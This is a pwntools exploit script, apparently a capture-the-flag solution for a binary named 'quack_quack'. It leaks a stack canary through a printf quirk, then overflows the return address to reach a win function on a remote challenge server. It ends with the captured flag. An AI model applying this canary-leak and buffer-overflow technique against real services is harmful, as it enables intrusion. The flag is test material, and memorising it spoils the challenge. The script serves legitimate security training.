# RazviOverflow

"""
The main objective is somehow leaking the canary and in the second `read` call
overflow main's ret address to jump to `sym.duck_attack`


Canary is at stack-0x10 (rbp-0x8)
buf is at stack-0x88

1st read writes 0x66 (102) @ buf
2nd read writes 0x6a (106) @ stack-0x68

Since the printf will print the index of "Quack Quack " in the original string +0x20,
maybe it can be tricked into printing the canary.

Canary is at stack-0x10, (-0x20) = stack-0x30. 
- Since buf 1st read writes at stack-0x88, 0x88-0x30 = 0x58
- "Quack Quack " must be at 0x58+1 index in order to print the Canary (as %s). +1 because the lowest byte of the canary is always null, stopping printf.

"""
from pwn import *
import sys
def debug(p):
    pid = util.proc.pidof(p)[0] 
    print("The pid is " + str(pid)) 
    util.proc.wait_for_debugger(pid)

context.binary = binary = ELF("./quack_quack")
context.log_level = "debug"

payload = ("A"*(0x58+1)+ "Quack Quack ")

#p = process()
p = remote("94.237.60.64", 36627)
if len(sys.argv) > 1 and sys.argv[1] == '-d':
    debug(p)
p.send(payload)
p.recvuntil(b"Quack Quack")
p.recvuntil(b"Quack Quack")
canary = p.recvuntil(b", ready").split(b",")[0].strip()[:7] # Only the first 7 bytes form the canary
canary = u64(canary.rjust(8, b'\x00')) # RIGHT ADJUST, THE \x00 BYTE WE ARE SKIPPING FROM PRINTIG MUST BE ADDED SINCE IT IS PART OF THE CANARY
print(f"Canary ->>>>>>>>>> {hex(canary)}")

duck_attack_address = p64(binary.symbols.duck_attack)

payload = b"A"*0x58
payload += p64(canary)
payload += b"B" * 8 # RBP
payload += duck_attack_address # Only lower 2 bytes will be actually written

p.sendline(payload)
p.interactive()

# Flag: HTB{~c4n4ry_g035_qu4ck_qu4ck~_20c2b742fcdf718a5a4874d4ca6ec759}